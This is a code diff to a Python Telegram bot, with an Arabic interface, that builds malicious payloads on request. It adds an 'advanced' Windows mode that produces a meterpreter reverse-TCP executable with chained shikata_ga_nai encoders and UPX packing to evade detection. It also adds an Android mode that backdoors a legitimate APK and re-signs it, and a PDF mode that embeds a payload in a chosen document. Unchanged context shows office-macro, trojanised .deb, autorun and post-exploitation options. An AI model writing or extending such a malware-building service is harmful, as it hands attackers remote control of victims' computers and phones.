@@ -39,6 +39,7 @@ class Session:
     kind: Optional[str] = None
     params: Dict[str, str] = None
     task_id: Optional[str] = None
+    adv: bool = False
 
 
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -51,6 +52,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return ConversationHandler.END
     kb = [
         [InlineKeyboardButton("بايلود ويندوز", callback_data="kind:payload")],
+        [InlineKeyboardButton("EXE متقدم (Windows)", callback_data="kind:winexe")],
         [InlineKeyboardButton("مستمع (Listener)", callback_data="kind:listener")],
         [InlineKeyboardButton("Android APK", callback_data="kind:android")],
         [InlineKeyboardButton("PDF مضمَّن", callback_data="kind:pdf")],
@@ -93,12 +95,25 @@ async def menu_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     sess: Session = context.user_data.get("session")
     sess.kind = kind
     sess.params = {}
+    sess.adv = False
+    # Support advanced toggle via explicit kinds where applicable
     back_kb = InlineKeyboardMarkup([[InlineKeyboardButton("⬅️ رجوع", callback_data="back")]])
     if kind == "payload":
         txt = (
             "أرسل المعلمات بهذا الشكل: LHOST LPORT OUTPUT_NAME\n"
             "مثال: 192.168.1.10 4444 win_test\n"
             "ملاحظة: سيتم استخدام payload افتراضي windows/meterpreter/reverse_tcp"
+        )
+        await query.edit_message_text(txt, reply_markup=back_kb)
+    elif kind == "winexe":
+        sess.adv = True
+        txt = (
+            "EXE متقدم (Windows).\n"
+            "أرسل: LHOST LPORT OUTPUT_NAME ARCH ENCODERS UPX\n"
+            "ARCH: x86 أو x64\n"
+            "ENCODERS (اختياري): سلسلة مفصولة بفواصل مثل x86/shikata_ga_nai:5,x86/countdown:3\n"
+            "UPX: true أو false\n"
+            "مثال: 127.0.0.1 4444 win_adv x86 x86/shikata_ga_nai:5 true"
         )
         await query.edit_message_text(txt, reply_markup=back_kb)
     elif kind == "listener":
@@ -109,20 +124,41 @@ async def menu_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         )
         await query.edit_message_text(txt, reply_markup=back_kb)
     elif kind == "android":
+        # Offer advanced android by toggling adv flag via simple instruction
+        adv_kb = InlineKeyboardMarkup([
+            [InlineKeyboardButton("إدخال بسيط", callback_data="kind:android_basic"), InlineKeyboardButton("خيارات متقدمة", callback_data="kind:android_adv")],
+            [InlineKeyboardButton("⬅️ رجوع", callback_data="back")]
+        ])
+        await query.edit_message_text("اختر الوضع:", reply_markup=adv_kb)
+        return MENU
+    elif data == "kind:android_basic":
+        sess.kind = "android"
+        sess.adv = False
+        await query.edit_message_text(
+            "أرسل: LHOST LPORT\nأمثلة: 10.0.2.2 4444 أو 192.168.x.x 4444",
+            reply_markup=back_kb
+        )
+        return PARAMS
+    elif data == "kind:android_adv":
+        sess.kind = "android"
+        sess.adv = True
         txt = (
-            "أرسل المعلمات بهذا الشكل: LHOST LPORT\n"
-            "مثال محاكي Android Studio: 10.0.2.2 4444\n"
-            "مثال Genymotion: 10.0.3.2 4444\n"
-            "أو داخل شبكة محلية: 192.168.x.x 4444\n"
-            "سيُستخدم APK عيّنة وسيتم إرسال الناتج لك."
+            "Android متقدم.\n"
+            "أرسل: MODE PERM LHOST LPORT [OUTPUT_NAME] [KEYSTORE:ALIAS:STOREPASS:KEYPASS]\n"
+            "MODE: backdoor_apk أو standalone\n"
+            "PERM: keep أو merge\n"
+            "مثال بدون توقيع: backdoor_apk keep 10.0.2.2 4444 myapp\n"
+            "مثال مع توقيع: backdoor_apk keep 10.0.2.2 4444 myapp /path/ks.jks:myalias:store:pass"
         )
         await query.edit_message_text(txt, reply_markup=back_kb)
+        return PARAMS
     elif kind == "pdf":
+        # Offer advanced base pdf
+        sess.adv = True
         txt = (
-            "توليد PDF مضمَّن بالبايلود.\n"
-            "أرسل: LHOST LPORT [OUTPUT_NAME]\n"
-            "مثال: 127.0.0.1 4444 report\n"
-            "إن لم تذكر OUTPUT_NAME سيُستخدم document افتراضياً."
+            "PDF مضمَّن.\n"
+            "أرسل: LHOST LPORT [OUTPUT_NAME] [BASE_PDF_PATH]\n"
+            "مثال: 127.0.0.1 4444 report /workspace/PE/original.pdf"
         )
         await query.edit_message_text(txt, reply_markup=back_kb)
     elif kind == "office":
@@ -175,6 +211,13 @@ async def params_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         lhost, lport, output_name = parts[:3]
         payload = "windows/meterpreter/reverse_tcp"
         sess.params = {"lhost": lhost, "lport": lport, "output_name": output_name, "payload": payload}
+    elif sess.kind == "winexe":
+        # advanced windows exe
+        if len(parts) < 6:
+            await update.message.reply_text("الاستخدام: LHOST LPORT OUTPUT_NAME ARCH ENCODERS UPX\nمثال: 127.0.0.1 4444 win_adv x86 x86/shikata_ga_nai:5 true")
+            return PARAMS
+        lhost, lport, output_name, arch, encoders, upx = parts[:6]
+        sess.params = {"lhost": lhost, "lport": lport, "output_name": output_name, "arch": arch, "encoders": encoders, "upx": upx, "payload": "windows/meterpreter/reverse_tcp"}
     elif sess.kind == "listener":
         if len(parts) < 2:
             await update.message.reply_text("الاستخدام: LHOST LPORT\nمثال: 0.0.0.0 4444")
@@ -182,22 +225,39 @@ async def params_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         lhost, lport = parts[:2]
         payload = "windows/meterpreter/reverse_tcp"
         sess.params = {"lhost": lhost, "lport": lport, "payload": payload}
-    elif sess.kind == "android":
+    elif sess.kind == "android" and not sess.adv:
         if len(parts) < 2:
             await update.message.reply_text("الاستخدام: LHOST LPORT\nأمثلة: 10.0.2.2 4444 أو 192.168.x.x 4444")
             return PARAMS
         lhost, lport = parts[:2]
         payload = "android/meterpreter/reverse_tcp"
         sess.params = {"lhost": lhost, "lport": lport, "payload": payload}
-    elif sess.kind == "pdf":
-        if len(parts) < 2:
-            await update.message.reply_text("الاستخدام: LHOST LPORT [OUTPUT_NAME]\nمثال: 127.0.0.1 4444 report")
+    elif sess.kind == "android" and sess.adv:
+        if len(parts) < 4:
+            await update.message.reply_text("الاستخدام: MODE PERM LHOST LPORT [OUTPUT_NAME] [KEYSTORE:ALIAS:STOREPASS:KEYPASS]")
             return PARAMS
-        lhost, lport = parts[0], parts[1]
+        mode, perm, lhost, lport = parts[:4]
+        output_name = parts[4] if len(parts) >= 5 else "app_backdoor"
+        ks_block = parts[5] if len(parts) >= 6 else ""
+        sess.params = {"mode": mode, "perm_strategy": perm, "lhost": lhost, "lport": lport, "output_name": output_name, "payload": "android/meterpreter/reverse_tcp"}
+        if ks_block:
+            try:
+                ks_path, alias, storepass, keypass = ks_block.split(":", 3)
+                sess.params.update({"keystore_path": ks_path, "key_alias": alias, "keystore_password": storepass, "key_password": keypass})
+            except Exception:
+                await update.message.reply_text("صيغة التوقيع غير صحيحة. استخدم: /path/ks.jks:alias:storepass:keypass")
+                return PARAMS
+    elif sess.kind == "pdf":
+        lhost = parts[0] if len(parts) >= 1 else ""
+        lport = parts[1] if len(parts) >= 2 else ""
         output_name = parts[2] if len(parts) >= 3 else "document"
-        payload = "windows/meterpreter/reverse_tcp"
-        sess.params = {"lhost": lhost, "lport": lport, "payload": payload, "output_name": output_name}
-        sess.kind = "pdf"
+        base_pdf = parts[3] if len(parts) >= 4 else ""
+        if not lhost or not lport:
+            await update.message.reply_text("الاستخدام: LHOST LPORT [OUTPUT_NAME] [BASE_PDF_PATH]")
+            return PARAMS
+        sess.params = {"lhost": lhost, "lport": lport, "output_name": output_name, "payload": "windows/meterpreter/reverse_tcp"}
+        if base_pdf:
+            sess.params["base_pdf_path"] = base_pdf
     elif sess.kind == "office":
         if len(parts) < 4:
             await update.message.reply_text("الاستخدام: TARGET LHOST LPORT OUTPUT_NAME\nمثال: ms_word_windows 127.0.0.1 4444 invoice")
@@ -209,20 +269,16 @@ async def params_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             return PARAMS
         payload = "windows/meterpreter/reverse_tcp"
         sess.params = {"suite_target": target, "lhost": lhost, "lport": lport, "payload": payload, "output_name": output_name}
-        sess.kind = "office"
     elif sess.kind == "deb":
         if len(parts) < 4:
             await update.message.reply_text("الاستخدام: DEB_PATH LHOST LPORT OUTPUT_NAME\nمثال: /path/app.deb 127.0.0.1 4444 mydeb")
             return PARAMS
         deb_path, lhost, lport, output_name = parts[:4]
         sess.params = {"deb_path": deb_path, "lhost": lhost, "lport": lport, "output_name": output_name}
-        sess.kind = "deb"
     elif sess.kind == "autorun":
-        # both params optional; support empty line
         exe_path = parts[0] if len(parts) >= 1 else ""
         exe_name = parts[1] if len(parts) >= 2 else "app4.exe"
         sess.params = {"exe_path": exe_path, "exe_name": exe_name}
-        sess.kind = "autorun"
     elif sess.kind == "postex":
         if len(parts) < 1:
             await update.message.reply_text("الاستخدام: SCRIPT_NAME [SESSION_ID]\nأمثلة: sysinfo.rc أو sysinfo.rc 1")
@@ -232,7 +288,6 @@ async def params_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         sess.params = {"script_name": script_name}
         if session_id:
             sess.params["session_id"] = session_id
-        sess.kind = "postex"
     else:
         await update.message.reply_text("خيار غير مدعوم")
         return ConversationHandler.END
